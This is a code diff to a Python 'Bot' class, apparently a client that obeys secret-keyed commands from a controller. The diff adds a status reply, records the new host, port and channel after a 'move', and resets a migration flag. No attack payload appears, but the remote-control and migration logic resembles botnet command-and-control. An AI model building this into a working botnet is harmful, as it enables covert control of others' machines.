@@ -59,9 +59,6 @@ class Bot:
     def setup(self):
         """ Setup the bot """
         
-        # get parsed arguments
-        self.parse()
-
         # reset variables
         self.CONTROLLER = None
 
@@ -169,6 +166,10 @@ class Bot:
             # shutdown bot
             if ("shutdown " + self.SECRET) in msg:
                 self.shutdown()
+
+            # send nick to controller
+            if ("status " + self.SECRET) in msg:
+                self.status()
 
             msg = msg.split()
 
@@ -319,6 +320,11 @@ class Bot:
         msg += " :Move " + host + " " + str(port) + " successful " + self.SECRET
         msg += "\n"
         
+        # reset variables
+        self.HOSTNAME = host
+        self.PORT = port
+        self.CHANNEL = chan
+
         self.send_msg(msg)
 
         # change flag
@@ -393,6 +399,8 @@ class Bot:
 
                     if self.MIGRATE:
                         self.setup()
+
+                        self.MIGRATE = False
                         
                     continue
 
@@ -402,10 +410,12 @@ class Bot:
                     print("DEBUG: MEssage sent")
 
 
-
 def run():
     """ Run the client """
     bot = Bot()
+
+    # get parsed arguments
+    bot.parse()
 
     while True:
         bot.setup()
